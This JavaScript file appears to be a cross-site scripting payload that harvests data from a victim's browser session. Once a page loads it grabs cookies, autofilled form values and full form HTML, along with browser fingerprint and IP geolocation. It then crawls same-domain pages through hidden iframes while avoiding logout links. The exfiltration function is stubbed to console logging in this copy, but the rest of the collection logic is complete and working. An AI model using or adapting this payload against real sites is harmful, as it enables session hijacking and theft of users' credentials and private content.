var typeContent = "CONTENT";
var typeCookie = "COOKIE";
var typeLink = "LINK";
var typeScript = "SCRIPT";
var typeForm = "FORM";
var typeBrowser = "BROWSER";
var typeLocation = "LOCATION";

// List of URLs that were already crawled. Used to prevent loops and unnecessary multiple extractions.
var sentUrlList = [];
// Timestamp used to tag the data for current execution together.
var timestamp = new Date().getTime();
// Should the script crawl each link it finds containing the same domain name.
var crawl = true;

// Send data back to the controller.
function sendData(type, data) {
    var domain = document.domain;
    var url = document.location.href;
    console.log(domain + " " + timestamp)
    console.log(type);
    console.log(data);
}

// Process all given links (a tags) and extract contents of each link. 
function processLinks(url, allATags) {
    var allLinks = {};
    for (var i = 0; i < allATags.length; i++) {
        var text = allATags[i].text.trim();
        var href = allATags[i].href;
        allLinks[href] = text;
    }
    sendData(typeLink, allLinks);
    for (var link in allLinks) {
        if (validURL(link) && link.indexOf(document.domain) > -1 && sentUrlList.indexOf(link) == -1) {
            sentUrlList.push(link);
            iframeFetch(typeContent, url, link);
            try {
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function () {
                    if (xhr.readyState == XMLHttpRequest.DONE) {
                        if (xhr.status == 200) {
                            sendData(typeContent, { 'url': url, 'link': link, 'content': xhr.responseText });
                            // Once content is extracted try to gather more URLs from the extracted page.
                            if (crawl) {
                                processText(url, xhr.responseText);
                            }
                        }
                    }
                };
                xhr.open("GET", link, true);
                xhr.send();
            } catch (err) {
                console.log("No lnk fch")
            }
        }
    }
}

// Process all given script tags and extract contents of each. 
function processScripts(url, allScriptTags) {
    for (var i = 0; i < allScriptTags.length; i++) {
        var src = allScriptTags[i].src;
        var innerText = allScriptTags[i].innerText;

        sendData(typeScript, { 'url': url, 'src': src, 'content': innerText });
        if (src.trim() != "" && validURL(src) && sentUrlList.indexOf(src) == -1) {
            sentUrlList.push(src);
            // If src mentioned, extract the content of the JS file (if CORS restrictions are not there) and
            // send as much information as possible.
            iframeFetch(typeScript, url, src);
            try {
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function () {
                    if (xhr.readyState == XMLHttpRequest.DONE) {
                        if (xhr.status == 200) {
                            sendData(typeScript, { 'url': url, 'src': src, 'content': xhr.responseText });
                        }
                    }
                };
                xhr.open("GET", src, true);
                xhr.send();
            } catch (err) {
                console.log("No scr fch")
            }
        }
    }
}

function iframeFetch(type, url, src) {
    try {
        var iframe = document.createElement('iframe');

        iframe.onload = function () {
            setTimeout(function () {
                if (iframe.contentDocument != null && iframe.contentDocument.innerText != "") {
                    if (type == typeContent) {
                        sendData(typeContent, { 'url': url, 'link': src, 'content': iframe.contentDocument.innerText });
                        // Once content is extracted try to gather more URLs from the extracted page.
                        if (crawl) {
                            processNode(iframe.contentDocument);
                        }
                    } else if (type == typeScript) {
                        sendData(type, { 'url': url, 'src': src, 'content': iframe.contentDocument.innerText });
                    }
                }
            }, 1000);
        };

        iframe.setAttribute("style", "display:none");
        iframe.width = "100%";
        iframe.height = "100%";
        iframe.src = src;

        body = document.getElementsByTagName('body')[0];
        body.appendChild(iframe)
    } catch (err) {
        console.log("Iframe load failed for " + src);
    }
}

// Process all given form tags and extract contents of each. 
function processForms(url, allFormTags) {
    if (allFormTags != null) {
        for (var i = 0; i < allFormTags.length; i++) {
            var action = allFormTags[i].action;
            var method = allFormTags[i].method;
            var allInputs = allFormTags[i].getElementsByTagName('input');
            var allProcessedInputs = [];

            // Extract information about input fields within the form. 
            for (var x = 0; x < allInputs.length; x++) {
                var input = allInputs[x];
                var name = input.name;
                var type = input.type;
                // This will extract auto filled content values. 
                var value = input.value;
                var placeholder = input.placeholder;
                allProcessedInputs.push({ 'name': name, 'type': type, 'value': value, 'placeholder': placeholder });
            }

            // Extract the source of the entire form. 
            var contents = "";
            try {
                contents = allFormTags[i].outerHTML;
            } catch (err) {
                contents = allFormTags[i].innerHTML;
            }

            sendData(typeForm, { 'url': url, 'action': action, 'method': method, 'content': contents, 'inputs': allProcessedInputs });
        }
    }
}

// Process a given HTML text and extract different interesting tags from the document. 
function processText(url, text) {
    var div = document.createElement("div");
    div.innerHTML = text;

    var allATags = div.getElementsByTagName("a");
    processLinks(url, allATags);

    var allScriptTags = div.getElementsByTagName("script");
    processScripts(url, allScriptTags);

    var allFormTags = div.forms;
    processForms(url, allFormTags);
}

// Process a given HTML document and extract different interesting tags from the document. 
function processNode(node) {
    var allATags = node.getElementsByTagName("a");
    processLinks(document.location.href, allATags);

    var allScriptTags = node.getElementsByTagName("script");
    processScripts(document.location.href, allScriptTags);

    var allFormTags = node.forms;
    processForms(document.location.href, allFormTags);
}

// Process browser metadata and send any important information back. 
function processBrowser() {
    // Credit: http://www.javascripter.net/faq/browsern.htm
    var nVer = navigator.appVersion;
    var nAgt = navigator.userAgent;
    var browserName = navigator.appName;
    var fullVersion = '' + parseFloat(navigator.appVersion);
    var majorVersion = parseInt(navigator.appVersion, 10);
    var nameOffset, verOffset, ix;

    // In Opera 15+, the true version is after "OPR/" 
    if ((verOffset = nAgt.indexOf("OPR/")) != -1) {
        browserName = "Opera";
        fullVersion = nAgt.substring(verOffset + 4);
    }
    // In older Opera, the true version is after "Opera" or after "Version"
    else if ((verOffset = nAgt.indexOf("Opera")) != -1) {
        browserName = "Opera";
        fullVersion = nAgt.substring(verOffset + 6);
        if ((verOffset = nAgt.indexOf("Version")) != -1)
            fullVersion = nAgt.substring(verOffset + 8);
    }
    // In MSIE, the true version is after "MSIE" in userAgent
    else if ((verOffset = nAgt.indexOf("MSIE")) != -1) {
        browserName = "Microsoft Internet Explorer";
        fullVersion = nAgt.substring(verOffset + 5);
    }
    // In Chrome, the true version is after "Chrome" 
    else if ((verOffset = nAgt.indexOf("Chrome")) != -1) {
        browserName = "Chrome";
        fullVersion = nAgt.substring(verOffset + 7);
    }
    // In Safari, the true version is after "Safari" or after "Version" 
    else if ((verOffset = nAgt.indexOf("Safari")) != -1) {
        browserName = "Safari";
        fullVersion = nAgt.substring(verOffset + 7);
        if ((verOffset = nAgt.indexOf("Version")) != -1)
            fullVersion = nAgt.substring(verOffset + 8);
    }
    // In Firefox, the true version is after "Firefox" 
    else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
        browserName = "Firefox";
        fullVersion = nAgt.substring(verOffset + 8);
    }
    // In most other browsers, "name/version" is at the end of userAgent 
    else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
        browserName = nAgt.substring(nameOffset, verOffset);
        fullVersion = nAgt.substring(verOffset + 1);
        if (browserName.toLowerCase() == browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }
    // trim the fullVersion string at semicolon/space if present
    if ((ix = fullVersion.indexOf(";")) != -1)
        fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(" ")) != -1)
        fullVersion = fullVersion.substring(0, ix);

    majorVersion = parseInt('' + fullVersion, 10);

    if (isNaN(majorVersion)) {
        fullVersion = '' + parseFloat(navigator.appVersion);
        majorVersion = parseInt(navigator.appVersion, 10);
    }

    var OSName = "Unknown OS";
    if (navigator.appVersion.indexOf("Win") != -1) OSName = "Windows";
    if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";
    if (navigator.appVersion.indexOf("X11") != -1) OSName = "UNIX";
    if (navigator.appVersion.indexOf("Linux") != -1) OSName = "Linux";
    if (navigator.userAgent.indexOf("Android") != -1) OSName = "Android";
    if (navigator.userAgent.indexOf("like Mac") != -1) OSName = "iOS";

    var pluginList = [];
    for (var i = 0; i < navigator.plugins.length; i++) {
        pluginList.push(navigator.plugins[i].name);
    }

    var data = {
        'BrowserName': browserName,
        'FullVersion': fullVersion,
        'MajorVersion': majorVersion,
        'navigator.appName': navigator.appName,
        'navigator.appVersion': navigator.appVersion,
        'navigator.userAgent': navigator.userAgent,
        'PluginList': pluginList
    };

    sendData(typeBrowser, data);

    // Credit: https://stackoverflow.com/questions/391979/how-to-get-clients-ip-address-using-javascript
    try {
        var req = new XMLHttpRequest();
        req.overrideMimeType("application/json");
        req.open('GET', 'https://ipapi.co/json/', true);
        req.onload = function () {
            try {
                sendData(typeLocation, JSON.parse(req.responseText));
            } catch (err) {
                console.log("No loq")
            }
        };
        req.send(null);
    } catch (err) {
        console.log("No loq")
    }
}

// Credit: https://plainjs.com/javascript/events/running-code-when-the-document-is-ready-15/
function ready(callback) {
    // in case the document is already rendered
    if (document.readyState != 'loading') callback();
    // modern browsers
    else if (document.addEventListener) document.addEventListener('DOMContentLoaded', callback);
    // IE <= 8
    else document.attachEvent('onreadystatechange', function () {
        if (document.readyState == 'complete') callback();
    });
}

function validURL(str) {
    //Defining the URL pattern
    /*
    var urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
        '((([a-z\\d]([a-z\\d-]*[a-z\\d])*))|' + // domain name
        '((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
        '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
        '(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
        '(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator*/

    //Defining the logout pattern
    var logoutPattern = new RegExp('logout|signout|log-out|sign-out')

    //if valid URL and does not contain logout
    if (/*urlPattern.test(str) &&*/ !logoutPattern.test(str.toLowerCase())) {
        return true
    } else {
        return false
    }
}

ready(function () {
    // Extract and send cookies.
    try {
        var cookieValues = document.cookie;
        sendData(typeCookie, cookieValues);
    } catch (err) {
        console.log("No cki data");
    }

    // Process browser metadata for different interesting information (browser name/version/OS) and send such.
    try {
        processBrowser();
    } catch (err) {
        console.log("No brw data");
    }

    // Process documents for different interesting tags (links/scripts/forms) and send such information. 
    try {
        processNode(document);
    } catch (err) {
        console.log("No doc data");
        console.log(err);
    }
});
